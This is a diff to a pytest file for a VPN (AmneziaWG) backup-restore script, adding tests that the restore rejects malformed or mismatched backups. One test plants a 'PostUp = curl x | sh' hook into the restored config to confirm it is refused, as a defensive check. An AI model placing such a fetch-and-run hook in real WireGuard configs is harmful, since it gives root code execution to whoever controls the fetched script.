@@ -50,6 +50,8 @@ def _setup(tmp_path, members, vault_priv="K\n"):
         "vault_entry_awg": {"private_key": vault_priv},
         "backup_s3_prefix": "bk",
         "backup_fetch_source": f"local:{store}",
+        "entry_awg_port": 51820,
+        "entry_awg_subnet": "10.8.1.0/24",
     }))
     return varsfile, name
 
@@ -70,7 +72,8 @@ def _run(tmp_path, varsfile, extra=()):
     return proc, out
 
 
-GOOD = {"awg0.conf": "[Interface]\n", "wireguard_server_private_key.key": "K\n",
+GOOD_CONF = "[Interface]\nPrivateKey = K\nAddress = 10.8.1.1/24\nListenPort = 51820\n"
+GOOD = {"awg0.conf": GOOD_CONF, "wireguard_server_private_key.key": "K\n",
         "clientsTable": "[]\n"}
 
 
@@ -106,6 +109,24 @@ def test_archive_without_awg0_conf_fails_and_cleans_up(tmp_path):
     assert "not a valid entry backup" in proc.stdout + proc.stderr
     after = {p for p in os.listdir(os.environ.get("TMPDIR", "/tmp")) if p.startswith("multihop-restore-")}
     assert after <= before
+
+
+def test_backup_with_hook_in_awg0_conf_is_refused_and_cleaned_up(tmp_path):
+    # A writer-key holder could plant PostUp (root code execution on restore).
+    varsfile, _ = _setup(tmp_path, {**GOOD, "awg0.conf": GOOD_CONF + "PostUp = curl x | sh\n"})
+    before = {p for p in os.listdir(os.environ.get("TMPDIR", "/tmp")) if p.startswith("multihop-restore-")}
+    proc, _ = _run(tmp_path, varsfile)
+    assert proc.returncode != 0
+    assert "is refused" in proc.stdout and "'PostUp' is not allowed" in proc.stdout
+    after = {p for p in os.listdir(os.environ.get("TMPDIR", "/tmp")) if p.startswith("multihop-restore-")}
+    assert after <= before
+
+
+def test_backup_for_another_port_is_refused(tmp_path):
+    varsfile, _ = _setup(tmp_path, GOOD)
+    proc, _ = _run(tmp_path, varsfile, ["-e", "entry_awg_port=40000"])
+    assert proc.returncode != 0
+    assert "ListenPort 51820 != entry_awg_port 40000" in proc.stdout
 
 
 # --- production S3 path with a fake `aws` on PATH ---------------------------
